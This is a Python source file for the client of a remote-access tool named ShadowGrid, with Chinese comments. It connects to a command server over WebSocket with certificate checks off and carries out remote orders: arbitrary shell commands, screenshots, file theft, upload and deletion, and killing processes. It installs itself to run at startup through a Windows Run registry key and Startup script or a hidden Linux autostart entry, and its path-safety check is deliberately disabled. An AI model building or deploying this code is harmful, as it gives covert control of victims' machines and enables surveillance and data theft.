import os
import uuid
import time
import base64
import json
import ssl
from pathlib import Path
import socket
import websocket
import subprocess
def is_safe_path(base_path, requested_path):
    # Disable path safety check for cross-platform compatibility
    return True
    
    base_abs = os.path.abspath(base_path)
    requested_abs = os.path.abspath(requested_path)
    
    # Normalize paths to handle different separators
    base_abs = os.path.normpath(base_abs)
    requested_abs = os.path.normpath(requested_abs)
    
    if requested_abs == base_abs:
        return True
    
    # Check if requested path is under base path
    return requested_abs.startswith(base_abs + os.sep) or requested_abs.startswith(base_abs + "\\") or requested_abs.startswith(base_abs + "/")

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

try:
    import psutil
except ImportError:
    psutil = None

SERVER_URL = "https://127.0.0.1:8444"
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 8444
CLIENT_ID = None
CLIENT_HOSTNAME = None

def get_hostname():
    try:
        return socket.getfqdn()
    except:
        return "unknown"

def get_websocket_url(svru):
    """构建WebSocket URL"""
    if svru:
        # 处理不同格式的服务器URL
        wss_url = svru.replace("https://", "wss://").replace("http://", "ws://")
        if not wss_url.startswith(("wss://", "ws://")):
            # 如果URL沒有協議前缀，則添加
            wss_url = f"wss://{wss_url.replace('http://', '').replace('https://', '')}"
        return f"{wss_url.rstrip('/')}/ws/"  # 确保路径以 /ws/ 结尾而不附加客户端ID
    return f"wss://127.0.0.1:8444/ws/"

SVR = os.environ.get("SERVER_URL", "https://127.0.0.1:8444")  # 默认服务器URL
WS = get_websocket_url(SVR)

CLIENT_HOSTNAME = os.environ.get("CLIENT_HOSTNAME") or CLIENT_HOSTNAME

# 打印信息时暂时没有ID，因为WS需要在main函数中才能完整确定
print(f"[Client] Server URL: {SVR}")
print(f"[Client] WebSocket URL (template): {WS}<client_id>")
print(f"[Client] Hostname: {CLIENT_HOSTNAME or get_hostname()}")

ID_FILE = Path.home() / ".srt_id"

def get_id():
    if ID_FILE.exists():
        try: return ID_FILE.read_text().strip()
        except: pass
    uid = str(uuid.uuid4().hex[:8])
    try: ID_FILE.write_text(uid)
    except: pass
    return uid

# 获取或生成客户端ID
CID = os.environ.get("CLIENT_ID") or get_id()
print(f"[Client] Client ID: {CID}")

CID = os.environ.get("CLIENT_ID") or get_id()
print(f"[Client] Client ID: {CID}")

current_dir = os.getcwd()

def run_cmd(cmd):
    import subprocess
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
    return r.stdout or r.stderr or ""

def handle(cmd):
    t, p = cmd.get("type"), cmd.get("payload")
    global current_dir
    if t == "test": return {"status":"ok","result":"OK","result_type":"test"}
    if t == "echo": return {"status":"ok","result":str(p),"result_type":"echo"}
    if t == "time": return {"status":"ok","result":time.strftime("%Y-%m-%d %H:%M:%S"),"result_type":"time"}
    if t == "screenshot"  :
        if not ImageGrab:
            return {"status":"error","result":"ImageGrab module not available","result_type":"error"}
        img = ImageGrab.grab()
        import tempfile
        with tempfile.NamedTemporaryFile(suffix=".png",delete=False) as f:
            img.save(f.name)
            data = base64.b64encode(open(f.name,"rb").read()).decode()
        os.remove(f.name)
        return {"status":"ok","result":data,"filename":"shot.png","result_type":"screenshot"}
    if t in ("ls","dir"):
        if p is None or p == '' or p == '.':
            path = current_dir
        else:
            path = os.path.join(current_dir, p)
        
        if not is_safe_path(current_dir, path):
            return {"status":"error","result":"Invalid path","result_type":"error"}
        path = os.path.abspath(path)
        items = os.listdir(path)
        return {"status":"ok","result":items,"result_type":"list"}
    if t == "cat":
        try:
            full_path = os.path.join(current_dir, p) if not os.path.isabs(p) else p
            if not is_safe_path(current_dir, full_path):
                return {"status":"error","result":"Invalid path","result_type":"error"}
            full_path = os.path.abspath(full_path)
            with open(full_path,"rb") as f:
                data = base64.b64encode(f.read()).decode()
            return {"status":"ok","result":data,"filename":os.path.basename(full_path),"result_type":"file"}
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"file"}
    if t == "dl":
        try:
            path = p.get("path")
            save_as = p.get("save_as", "")
            if not path:
                return {"status":"error","result":"Path required","result_type":"error"}
            full_path = os.path.join(current_dir, path) if not os.path.isabs(path) else path
            if not is_safe_path(current_dir, full_path):
                return {"status":"error","result":"Invalid path","result_type":"error"}
            full_path = os.path.abspath(full_path)
            if not os.path.isfile(full_path):
                return {"status":"error","result":"File not found","result_type":"error"}
            with open(full_path,"rb") as f:
                data = base64.b64encode(f.read()).decode()
            filename = save_as if save_as else os.path.basename(full_path)
            return {"status":"ok","result":data,"filename":filename,"result_type":"file"}
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"error"}
    if t == "ud":
        try:
            base64_data = p.get("base64_data")
            save_as = p.get("save_as")
            if not base64_data or not save_as:
                return {"status":"error","result":"Need base64_data and save_as","result_type":"error"}
            full_path = os.path.join(current_dir, save_as) if not os.path.isabs(save_as) else save_as
            if not is_safe_path(current_dir, full_path):
                return {"status":"error","result":"Invalid path","result_type":"error"}
            full_path = os.path.abspath(full_path)
            os.makedirs(os.path.dirname(full_path), exist_ok=True) if os.path.dirname(full_path) else None
            with open(full_path,"wb") as f:
                f.write(base64.b64decode(base64_data))
            return {"status":"ok","result":"File saved successfully","result_type":"ok"}
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"error"}
    if t == "cd":
        try:
            new_dir = os.path.join(current_dir, p) if not os.path.isabs(p) else p
            if not is_safe_path(current_dir, new_dir):
                return {"status":"error","result":"Invalid path","result_type":"error"}
            new_dir = os.path.abspath(new_dir)
            if os.path.isdir(new_dir):
                current_dir = new_dir
                return {"status":"ok","result":current_dir,"result_type":"dir"}
            else:
                return {"status":"error","result":"Directory not found","result_type":"error"}
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"error"}
    if t == "pwd":
        return {"status":"ok","result":current_dir,"result_type":"dir"}
    if t == "rm":
        try:
            path = p.get("path")
            recursive = p.get("recursive", False)
            if not path:
                return {"status":"error","result":"Path required","result_type":"error"}
            full_path = os.path.join(current_dir, path) if not os.path.isabs(path) else path
            if not is_safe_path(current_dir, full_path):
                return {"status":"error","result":"Invalid path","result_type":"error"}
            full_path = os.path.abspath(full_path)
            if os.path.isdir(full_path):
                if recursive:
                    import shutil
                    shutil.rmtree(full_path)
                else:
                    os.rmdir(full_path)
            elif os.path.isfile(full_path):
                os.remove(full_path)
            else:
                return {"status":"error","result":"Path not found","result_type":"error"}
            return {"status":"ok","result":"Deleted successfully","result_type":"ok"}
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"error"}
    if t == "mv":
        try:
            from_path = p.get("from_path")
            to_path = p.get("to_path")
            if not from_path or not to_path:
                return {"status":"error","result":"Need from_path and to_path","result_type":"error"}
            src = os.path.join(current_dir, from_path) if not os.path.isabs(from_path) else from_path
            dst = os.path.join(current_dir, to_path) if not os.path.isabs(to_path) else to_path
            if not is_safe_path(current_dir, src):
                return {"status":"error","result":"Invalid source path","result_type":"error"}
            if not is_safe_path(current_dir, dst):
                return {"status":"error","result":"Invalid destination path","result_type":"error"}
            src = os.path.abspath(src)
            dst = os.path.abspath(dst)
            if not os.path.exists(src):
                return {"status":"error","result":"Source not found","result_type":"error"}
            os.makedirs(os.path.dirname(dst), exist_ok=True) if os.path.dirname(dst) else None
            os.rename(src, dst)
            return {"status":"ok","result":"Moved/renamed successfully","result_type":"ok"}
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"error"}
    if t == "file":
        try:
            path = p.get("path")
            if not path:
                return {"status":"error","result":"Path required","result_type":"error"}
            full_path = os.path.join(current_dir, path) if not os.path.isabs(path) else path
            if not is_safe_path(current_dir, full_path):
                return {"status":"error","result":"Invalid path","result_type":"error"}
            full_path = os.path.abspath(full_path)
            if not os.path.exists(full_path):
                return {"status":"error","result":"Path not found","result_type":"error"}
            file_type = "unknown"
            if os.path.isfile(full_path):
                ext = os.path.splitext(full_path)[1].lower()
                if ext in ['.txt', '.md', '.csv', '.json', '.xml', '.ini', '.log']:
                    file_type = "text"
                elif ext in ['.exe', '.bat', '.cmd', '.sh', '.bin', '.dll', '.so', '.dylib']:
                    file_type = "executable"
                elif ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg', '.ico']:
                    file_type = "image"
                elif ext in ['.pdf']:
                    file_type = "pdf"
                elif ext in ['.mp3', '.wav', '.flac', '.aac']:
                    file_type = "audio"
                elif ext in ['.mp4', '.avi', '.mkv', '.mov']:
                    file_type = "video"
                elif ext in ['.zip', '.tar', '.gz', '.7z', '.rar']:
                    file_type = "archive"
                else:
                    file_type = "file"
            elif os.path.isdir(full_path):
                file_type = "directory"
            elif os.path.islink(full_path):
                file_type = "shortcut"
            return {"status":"ok","result":file_type,"result_type":"file"}
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"error"}
    
    if t == "shell":
        try:
            result = subprocess.run(p, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
            return {"status": "ok", "result": output, "result_type": "shell"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    if t in ("ps", "process"):
        if not psutil:
            return {"status":"error","result":"psutil module not available","result_type":"error"}
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'status']):
                try:
                    processes.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            return {"status":"ok","result":processes,"result_type":"process_list"}
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"error"}

    if t == "kill":
        if not psutil:
            return {"status":"error","result":"psutil module not available","result_type":"error"}
        pid = None
        try:
            if isinstance(p, dict) and p.get("pid") is not None:
                pid_val = p.get("pid")
                if isinstance(pid_val, str) and pid_val.isdigit():
                    pid = int(pid_val)
                elif isinstance(pid_val, int):
                    pid = int(pid_val)
                else:
                    pid = None
            elif isinstance(p, str) and p.isdigit():
                pid = int(p)
            elif isinstance(p, int):
                pid = p
            else:
                pid = None
            
            if pid is None:
                return {"status":"error","result":"PID must be a valid integer","result_type":"error"}
                
            if not isinstance(pid, int) or pid <= 0:
                return {"status":"error","result":"PID must be a positive integer","result_type":"error"}
            
            proc = psutil.Process(pid)
            proc.terminate()
            proc.wait(timeout=5)
            return {"status": "ok", "result": f"Process {pid} terminated successfully", "result_type": "process_killed"}
        except psutil.NoSuchProcess:
            return {"status":"error","result":f"No process with PID {pid}","result_type":"error"} if pid else {"status":"error","result":"No process with specified PID","result_type":"error"}
        except psutil.AccessDenied:
            return {"status":"error","result":f"Access denied to kill process {pid}","result_type":"error"} if pid else {"status":"error","result":"Access denied to kill process","result_type":"error"}
        except TypeError:
            return {"status":"error","result":"PID must be a valid integer","result_type":"error"}
        except ValueError:
            return {"status":"error","result":"PID must be a valid integer","result_type":"error"}
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"error"}

    if t in ("persist", "install"):
        try:
            import sys
            import platform
            from pathlib import Path
            
            action = p.get("action", "install") if isinstance(p, dict) else "install"
            target_path = p.get("path", "") if isinstance(p, dict) else ""
            
            current_exe = sys.argv[0]
            
            # 获取用户主目录
            home_dir = str(Path.home())
            
            if platform.system() == "Windows":
                import winreg
                
                startup_folder = Path(home_dir) / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
                
                if action == "install":
                    # 复制客户端到指定目录（如果提供）
                    if target_path:
                        import shutil
                        client_dest = Path(target_path) / "shadowgrid-client.exe" 
                        if not Path(target_path).exists():
                            os.makedirs(target_path, exist_ok=True)
                        
                        # 只能在开发环境中复制当前脚本，实际运行时应为编译后的可执行文件
                        # 因此我们创建一个批处理文件作为替代方案
                        startup_script = f"""@echo off
    echo Waiting for network...
    ping 127.0.0.1 -n 10 > NUL
    cd /d "{Path(current_exe).parent}"
    python "{current_exe}" > "C:\\Windows\\Temp\\sg-client.log" 2>&1
    """
                        startup_script_path = startup_folder / "shadowgrid-startup.bat"
                        startup_script_path.write_text(startup_script)
                        
                        # 添加到注册表
                        key_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                            winreg.SetValueEx(key, "ShadowGridClient", 0, winreg.REG_SZ, str(startup_script_path))
                    
                    return {"status": "ok", "result": "Client persistence configured", "result_type": "persistence"}
                
                elif action == "remove":
                    # 移除启动项
                    try:
                        startup_script = startup_folder / "shadowgrid-startup.bat"
                        if startup_script.exists():
                            startup_script.unlink()
                        
                        key_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
                            winreg.DeleteValue(key, "ShadowGridClient")
                    except Exception:
                        pass
                    
                    return {"status": "ok", "result": "Client persistence removed", "result_type": "persistence"}
            
            else:  # Linux/macOS
                if action == "install":
                    autostart_dir = Path(home_dir) / ".config" / "autostart"
                    autostart_dir.mkdir(parents=True, exist_ok=True)
                    
                    # 创建desktop文件
                    desktop_content = f"""[Desktop Entry]
Type=Application
Name=ShadowGrid Client
Exec=python3 {current_exe}
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
Comment=ShadowGrid Remote Management Client
"""
                    
                    desktop_file = autostart_dir / "shadowgrid-client.desktop"
                    desktop_file.write_text(desktop_content)
                    
                    return {"status": "ok", "result": "Client persistence configured", "result_type": "persistence"}
                
                elif action == "remove":
                    autostart_file = Path(home_dir) / ".config" / "autostart" / "shadowgrid-client.desktop"
                    if autostart_file.exists():
                        autostart_file.unlink()
                    
                    return {"status": "ok", "result": "Client persistence removed", "result_type": "persistence"}
            
            return {"status": "ok", "result": f"Action '{action}' completed", "result_type": "persistence"}
                
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    if t == "find":
        try:
            start_path = p.get("path")
            name_pattern = p.get("name")
            file_type = p.get("type")
            if not start_path:
                return {"status":"error","result":"Path required","result_type":"error"}
            full_path = os.path.join(current_dir, start_path) if not os.path.isabs(start_path) else start_path
            if not is_safe_path(current_dir, full_path):
                return {"status":"error","result":"Invalid path","result_type":"error"}
            full_path = os.path.abspath(full_path)
            if not os.path.exists(full_path):
                return {"status":"error","result":"Start path not found","result_type":"error"}
            results = []
            name_pattern_lower = name_pattern.lower() if name_pattern else None
            for root, dirs, files in os.walk(full_path):
                for name in files:
                    if name_pattern_lower is None or name_pattern_lower in name.lower():
                        full_item = os.path.join(root, name)
                        if file_type is None or file_type == "file":
                            results.append({"path": full_item, "type": "file"})
                if file_type is None or file_type == "dir":
                    for name in dirs:
                        if name_pattern_lower is None or name_pattern_lower in name.lower():
                            full_item = os.path.join(root, name)
                            results.append({"path": full_item, "type": "dir"})
            return {"status":"ok","result":results,"result_type":"list"}
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"error"}
    return {"status":"error","result":f"Unknown command: {t}","result_type":"unknown"}

def on_msg(ws, msg):
    try:
        msg = json.loads(msg)
        print(f"[Client] Received: {msg}")
        if msg.get("type") == "command":
            payload = msg.get("payload", {})
            print(f"[Client] Processing command: {payload}")
            result = handle(payload)
            print(f"[Client] Result: {result}")
            ws.send(json.dumps({"type":"result","command_id":msg.get("id",""),"result":result}))
            print(f"[Client] Response sent")
    except Exception as e:
        print(f"[Client] Message error: {e}")

def on_error(ws, error):
    print(f"[Client] Error: {error}")

def on_close(ws, close_status_code, close_msg):
    print(f"[Client] Closed: {close_status_code} - {close_msg}")

def on_open(ws):
    hostname = get_hostname()
    print(f"[Client] Connected, registering hostname: {hostname}")
    try:
        ws.send(json.dumps({
            "type": "register",
            "client_id": CID,
            "hostname": hostname,
            "unique_id": get_id()
        }))
        print(f"[Client] Registration successful")
    except Exception as e:
        print(f"[Client] Registration error: {e}")

def main():
    global CID  # 确保使用全局CID变量
    
    print(f"[Client] Starting WebSocket...")
    
    # 获取或生成客户端ID
    CID = os.environ.get("CLIENT_ID") or get_id()
    current_hostname = CLIENT_HOSTNAME or get_hostname()
    
    print(f"[Client] Client ID: {CID} ({current_hostname})")
    
    ws_url = WS + CID  # 确保完整连接地址格式正确
    print(f"[Client] Connecting to {ws_url}...")
    
    ws = websocket.WebSocketApp(
        ws_url,
        on_open=on_open,
        on_message=on_msg,
        on_error=on_error,
        on_close=on_close,
    )
    
    while True:
        try:
            print(f"[Client] Attempting connection to {ws_url}...")
            ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
        except Exception as e:
            print(f"[Client] Run error: {e}")
        print(f"[Client] Retry in 3 seconds...")
        time.sleep(3)

if __name__ == "__main__":
    main()
